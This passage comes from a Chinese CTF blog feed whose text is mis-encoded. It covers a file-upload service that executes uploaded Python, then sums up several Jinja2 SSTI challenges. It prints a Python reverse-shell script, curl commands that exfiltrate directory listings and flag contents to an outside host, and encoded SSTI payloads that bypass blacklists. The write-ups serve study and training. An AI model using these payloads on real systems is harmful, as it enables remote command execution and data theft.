class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        f.save(os.path.join(f.filename))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            output = check_output([<span class="string">&#x27;python3&#x27;</span>, f.filename], stderr=STDOUT, timeout=<span class="number">80</span>)</span><br><span class="line">            content = output.decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            content = e.__str__()</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;rm&#x27;</span>, f.filename]))</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(port=<span class="number">5000</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¯¹æºç è¿›è¡Œå®¡è®¡ å‘ç°ä¸Šä¼ æ–‡ä»¶åä¼šæ‰§è¡Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œäºæ˜¯å°è¯•åå¼¹shellï¼Œä¸Šä¼ å¦‚ä¸‹è„šæœ¬ï¼š</p><p>è¿™é‡Œè¯·æ³¨æ„ç†è§£è¯¥æ®µä»£ç çš„ä½œç”¨ï¼Œå’Œbash -ié‚£ä¸ªçš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯å°†std out std in std erré‡å®šå‘è‡³socketã€‚</p><p>è¯¦ç»†çš„åˆ†æé“¾æ¥æ”¾åœ¨äº†æœ€åé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os </span><br><span class="line"> </span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,<span class="number">6666</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>) </span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>æœ¬åœ°ç›‘å¬æèµ·æ¥ï¼Œç„¶åä¸Šä¼ ï¼Œå¾—åˆ°åå¼¹è¿‡æ¥çš„shell</p><p>ä¸‹é¢å®¡è®¡server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line">PORT = <span class="number">21587</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;*ctf&#x27;</span>:</span><br><span class="line">                content = <span class="built_in">open</span>(<span class="string">&#x27;oh-some-funny-code&#x27;</span>).read()</span><br><span class="line">                tcpCliSock.send((content.encode()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tcpCliSock.send((<span class="string">&#x27;[%s] %s&#x27;</span> % (ctime(), data)).encode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cnt &gt;= <span class="number">2</span>:</span><br><span class="line">        time.sleep(<span class="number">120</span>)</span><br><span class="line">        tcpSerSock.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagçš„æ¡ä»¶æ˜¯å‘é€çš„æ•°æ®ä¸ºbâ€™*ctfâ€™</p><p>å‘ç°è¿™ä¸ªsocketå†™çš„æœ‰äº›é—®é¢˜ï¼Œè¿æ¥å¤§äº2æ—¶å°±æ–­å¼€äº†ï¼Œæ‰€ä»¥éœ€è¦å°è¯•è‡ªå·±å†™ä¸ªsocketè¿è¿›å»ï¼Œé˜²æ­¢åˆ«äººåœ¨è¿ï¼Œè¦ä¸€ç›´å¾ªç¯ã€‚</p><p>äºæ˜¯å¾—åˆ°å¦‚ä¸‹clientçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">&#x27;172.25.0.2&#x27;</span></span><br><span class="line">PORT=<span class="number">21587</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST,PORT)</span><br><span class="line">tcpCliSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpCliSock.connect(ADDR)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=<span class="string">b&#x27;*ctf&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">tcpCliSock.send(data)</span><br><span class="line">data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">tcpCliSock.close()</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œé¢˜ç›®çš„æœåŠ¡å™¨æ¯ä¸¤åˆ†é’Ÿé‡å¯ä¸€æ¬¡ï¼Œæ‹¿åˆ°shellåå†è£…vimä»€ä¹ˆçš„å¤ªæ…¢äº†ï¼Œäºæ˜¯å°†è„šæœ¬base64ç¼–ç ï¼Œ</p><p>echo base64_encoded_script | base64 -d &gt;1.py</p><p>ä»¥è¿™ç§æ–¹å¼å°†è„šæœ¬å†…å®¹ä¸Šä¼ è‡³webserverï¼Œpython3 1.pyæ‰§è¡Œå³å¯ã€‚</p><img src="http://cdn.polowong.top/static/images/xingctf.png"><p>æˆ‘è®¤ä¸ºclient.py å’Œclientçš„å®¹å™¨æ˜¯èµ·è¿·æƒ‘ä½œç”¨ æˆ–è€…è¯´æ˜¯æ¨¡æ‹Ÿåˆ«äººåœ¨å‘serverå‘é€è¯·æ±‚ï¼Œæ‰€ä»¥åœ¨æœ¬åœ°æ¨¡æ‹Ÿæ—¶æŠŠclientå®¹å™¨downæ‰å°±å¯ä»¥äº†ã€‚</p><p>ä¸ºäº†éªŒè¯è¿™é‡Œä¸€ç†è®ºï¼Œæˆ‘åœ¨é¢˜ç›®çš„åœ¨çº¿ç¯å¢ƒä¸­é€šè¿‡webserveræ‰“åˆ°clientæœåŠ¡å™¨è¿›è¡Œäº†LFIï¼Œå‘ç°å¹¶æ²¡æœ‰client.pyï¼Œæˆ‘è®¤ä¸ºä¸Šè¿°è¯´æ³•æˆç«‹ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å½“å‰è¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸çŸ¥é“æ˜¯å“ªå¥è¯å®ç°äº†åˆ é™¤æ–‡ä»¶å‰æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å†…å®¹ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p>é›ªå®wp</p><p><a href="https://blog.csdn.net/weixin_30526593/article/details/98650248">https://blog.csdn.net/weixin_30526593/article/details/98650248</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è¿‘æœŸsstié¢˜ç›®æ€»ç»“</title>
      <link href="2020/12/22/%E8%BF%91%E6%9C%9Fssti/"/>
      <url>2020/12/22/%E8%BF%91%E6%9C%9Fssti/</url>
      
        <content type="html"><![CDATA[<p>åˆ†æä¸‹è¿‘æœŸåšè¿‡çš„sstié¢˜ç›®çš„æ€è·¯</p><h1 id="ä½ çš„åå­—-é¢˜ç›®åˆ†æ"><a href="#ä½ çš„åå­—-é¢˜ç›®åˆ†æ" class="headerlink" title="ä½ çš„åå­— é¢˜ç›®åˆ†æ"></a>ä½ çš„åå­— é¢˜ç›®åˆ†æ</h1><p>æ‰“å¼€é¢˜ç›® å‘ç°è¾“å…¥åå­—</p><p>å°è¯•è¾“å…¥4</p><p>æŠ¥äº†ä¸€ä¸ªphpçš„é”™è¯¯</p><p>ç»§ç»­å°è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print 2*5 %&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸ.</p><p>ä¸‹é¢å°†å°è¯•åˆ©ç”¨sstiè¿›è¡Œæ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ</p><p>å°è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print config%&#125;</span><br></pre></td></tr></table></figure><p>å¤±è´¥ï¼Œè¿”å›å€¼ä¸ºç©º</p><p>å°è¯•å¤šä¸ªå…³é”®å­—åï¼Œå‘ç°æ˜¯å¯¹é»‘åå•å…³é”®è¯é‡‡å–äº†ç½®ç©ºçš„æ–¹æ³•è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘åœ¨å…³é”®å­—ä¸­åŠ å…¥å¦ä¸€ä¸ªå…³é”®å­—çš„æ–¹å¼ï¼Œå¦‚ iconfigf ä»£è¡¨ifã€‚</p><p>é¦–å…ˆè·å¾—æ‰€æœ‰å­ç±»</p><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.__claconfigss__.__mrconfigo__[<span class="number">2</span>].__subclconfigasses__()%&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æ‰€æœ‰å­ç±»åï¼ŒæŸ¥æ‰¾init globalå­˜åœ¨osæ¨¡å—çš„ç±»ï¼Œå¸¸è§çš„æ˜¯catch_warningsç±»</p><p>æˆ‘è¿™é‡Œç”¨çš„æ˜¯ç¬¨æ–¹æ³•ï¼Œå°†æ‰€æœ‰çš„å­ç±»æ‰“å°å‡ºæ¥åæ”¾åˆ°sublimeé‡Œé¢æ‰¾åˆ°çš„catch_waringsç±»çš„ä¸‹æ ‡ä¸º59</p><p>ä¸‹é¢å°†è¿›ä¸€æ­¥åˆ©ç”¨è¯¥ç±»å®ç°å‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;ls &#x2F; |base64&#96;  &#39;)%&#125;</span><br><span class="line"></span><br><span class="line">é€šè¿‡curlå¤–å¸¦å‘½ä»¤æ‰§è¡Œçš„ç»“æœ,è·å¾—äº†å¤–å¸¦çš„æ ¹ç›®å½•lsçš„ç»“æœï¼Œå‘ç°äº†flagçš„å­˜æ”¾ä½ç½®ï¼Œç›´æ¥getflagã€‚</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;tail &#x2F;flag_1s_Hera|base64&#96;&#39;)%&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h2><p>ä»‹ç»popençš„ç”¨æ³•</p><p>popenæ–¹æ³•åœ¨osæ¨¡å—ä¸‹ï¼Œä½¿ç”¨å‰éœ€è¦import os</p><p>popenæ˜¯ä»ä¸€ä¸ªå‘½ä»¤æ‰“å¼€ä¸€ä¸ªç®¡é“ï¼Œè¿”å›å€¼æ„å‘³ç€æ‰§è¡Œç»“æœï¼Œæ­£å¸¸æ‰§è¡Œçš„è¯è¿”å›å€¼ä¸º0</p><p>popenåœ¨sstiä¸­å¸¸ä½œä¸ºæ›¿ä»£systemè¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ä¸€ç§æ–¹å¼ï¼Œç°æ¼”ç¤ºpopenç”¨æ³•</p><img src="http://cdn.polowong.top/static/images/ssti4.png"><p>åœ¨æ­¤ä¾‹ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨os.popen.read()æ–¹æ³•ä¼šè¿”å›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç»“æœï¼Œè€Œä¸æ˜¯æ‰§è¡ŒæˆåŠŸçš„è¿”å›å€¼0</p><p>popenæ–¹æ³•ä¸­subprocessæ¨¡å—ä¸‹ä¹Ÿæœ‰ã€‚</p><h1 id="å®‰æ´µæ¯-normal-ssti"><a href="#å®‰æ´µæ¯-normal-ssti" class="headerlink" title="å®‰æ´µæ¯ normal_ssti"></a>å®‰æ´µæ¯ normal_ssti</h1><p>é¦–å…ˆçœ‹è¿‡æ»¤äº†å“ªäº›å…³é”®å­—</p><img src="http://cdn.polowong.top/static/images/ssti1.png"><p>ä½¿ç”¨burp fuzzå…³é”®å­—ï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šçš„å…³é”®å­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆçœ‹è¿‡æ»¤äº†&#123;&#123;,å¯ä»¥ä½¿ç”¨&#123;%print%&#125;</span><br></pre></td></tr></table></figure><p>çš„æ–¹å¼æ‰§è¡Œè¡¨è¾¾å¼</p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ç”¨å°æ‹¬å·çš„æ–¹å¼ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(1)%&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜è¿‡æ»¤äº†.  å¯ä»¥ç”¨a t t r()ç»•è¿‡</p><p>å…¶ä»–çš„å…³é”®å­—å¯ä»¥è€ƒè™‘ä½¿ç”¨unicodeç¼–ç ç»•è¿‡</p><p>lipsumæ–¹æ³•globlas-builtinsä¸­å­˜åœ¨osæ¨¡å—ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>é¦–å…ˆæ„é€ æœªç¼–ç payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ ç¼–ç payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0077\u0068\u006f\u0061\u006d\u0069&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥å°è¯•è¯»å–flagï¼š</span><br><span class="line"></span><br><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat&lt;&gt;&#x2F;flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/ssti2.png"><h2 id="å¦ä¸€ç§æ€è·¯"><a href="#å¦ä¸€ç§æ€è·¯" class="headerlink" title="å¦ä¸€ç§æ€è·¯"></a>å¦ä¸€ç§æ€è·¯</h2><p>çœ‹äº†å¸ˆå‚…ä»¬çš„è§£æ³•ï¼Œæˆ‘åœ¨å°è¯•å¦ä¸€ç§ç¼–ç ç»•è¿‡çš„æ–¹å¼è§£å†³è¿™ä¸ªé—®é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(1|attr(%22\137\137class\137\137%22)|attr(%22\137\137mro\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(1)|attr(%22\137\137subclasses\137\137%22)()|attr(%22\137\137\147etitem\137\137%22)(186)|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;sys&quot;)|attr(&quot;modules&quot;)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;os&quot;)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(a|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(%22sys%22)|attr(%22modules%22)|attr(%22\137\137\147etitem\137\137%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä¸¤ç§æ–¹æ³•æ˜¯é€šè¿‡æ‰¾sysæ¨¡å—ä¸­çš„osè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ï¼ˆè†œä¸€ä¸‹å¸ˆå‚…ï¼šï¼‰</p><h1 id="nctf-2020-ssti"><a href="#nctf-2020-ssti" class="headerlink" title="nctf 2020 ssti"></a>nctf 2020 ssti</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure><p>æ‡’äº†ï¼Œæ”¹ä¸€ä¸‹ä¸Šé¢˜çš„blacklistç»§ç»­è·‘ï¼ˆdoge</p><p>å…ˆç”¨bp fuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ã€‚</p><img src="http://cdn.polowong.top/static/images/ssti3.png"><p>æ ¹æ®ä¸Šé¢˜æ€è·¯ï¼Œå°è¯•unicodeç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ï¼Œå¦‚</p><p>class -&gt;  \u0063\u006c\u0061\u0073\u0073</p><p>è¿™ç§æ–¹æ³•å¯ä»¥æˆåŠŸbypassã€‚</p><p>å®˜æ–¹wpçš„æ–¹æ³•æ˜¯ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸‹é¢æ˜¯ç”¨16è¿›åˆ¶ç»•è¿‡çš„pldï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.90.89.27:5050/test?url=&#123;&#123;%22%22[%22\x5f\x5fcla%22+%22ss\x5f\x5f%22][%22\x5f\x5fmr%22+%22o\x5f\x5f%22][1][%22\x5f\x5fsubcla%22+%22sses\x5f\x5f%22]()[186][%22\x5f\x5fin%22+%22it\x5f\x5f%22][%22\x5f\x5fgloba%22+%22ls\x5f\x5f%22][%22sys%22][%22modules%22][%22os%22][%22popen%22](%22cat%3C%3E/flag%22)[%22read%22]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="unctf2020-ssti"><a href="#unctf2020-ssti" class="headerlink" title="unctf2020 ssti"></a>unctf2020 ssti</h1><p>blacklist:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ ] <span class="string">&#x27; &quot; _</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[] : __getitem__</span><br><span class="line"><span class="string">&#x27;å’Œ&quot;: request.args.xxx</span></span><br><span class="line"><span class="string">_: |attr()</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:http://192.168.0.116:5000/?url=&#123;&#123;()|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclass)()|attr(request.args.getitem)(186)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.sys)|attr(request.args.mod)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.whoami)|attr(request.args.read)()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__&amp;&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;sys=sys&amp;mod=modules&amp;os=os&amp;popen=popen&amp;whoami=whoami&amp;read=read</span><br></pre></td></tr></table></figure><h1 id="nctf-2020-ä½ å°±æ˜¯æˆ‘çš„masterå—"><a href="#nctf-2020-ä½ å°±æ˜¯æˆ‘çš„masterå—" class="headerlink" title="nctf 2020 ä½ å°±æ˜¯æˆ‘çš„masterå—"></a>nctf 2020 ä½ å°±æ˜¯æˆ‘çš„masterå—</h1><p>blacklistï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; . _ class base subclasses request</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; :  &quot;&quot;</span></span><br><span class="line"><span class="string">. :[&quot;xxx&quot;] </span></span><br><span class="line"><span class="string">_:å…«è¿›åˆ¶ åå…­è¿›åˆ¶ Unicode ç»•è¿‡ å…«è¿›åˆ¶å¦‚\137</span></span><br><span class="line"><span class="string">å…³é”®å­—ï¼š å­—ç¬¦ä¸²æ‹¼æ¥ å¦‚ &quot;cla&quot;+&quot;ss&quot;</span></span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:5000/?</span><br><span class="line">url=&#123;&#123;0[&quot;\137\137cla&quot;+&quot;ss\137\137&quot;][&quot;\137\137mro\137\137&quot;][1][&quot;\137\137subclas&quot;+&quot;ses\137\137&quot;]()[186][&quot;\137\137init\137\137&quot;][&quot;\137\137globals\137\137&quot;][&quot;sys&quot;][&quot;modules&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" 